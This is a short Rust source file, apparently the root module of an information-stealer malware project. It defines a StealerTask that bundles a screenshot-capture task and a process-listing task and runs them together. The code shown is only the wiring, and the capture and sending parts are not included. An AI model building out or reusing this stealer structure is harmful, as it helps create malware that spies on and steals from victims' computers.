mod screenshot;
mod processes;

use crate::stealer::processes::ProcessesTask;
use crate::stealer::screenshot::ScreenshotTask;
use alloc::sync::Arc;
use alloc::vec;
use tasks::{CompositeTask, Task};
use utils::path::Path;

pub struct StealerTask {
    inner: CompositeTask
}

impl StealerTask {
    pub fn new() -> Self {
        Self {
            inner: CompositeTask::new(
                vec![
                    Arc::new(ScreenshotTask),
                    Arc::new(ProcessesTask),
                ]
            )
        }
    }
}

impl Task for StealerTask {
    unsafe fn run(&self, parent: &Path) {
        self.inner.run(parent);
    }
}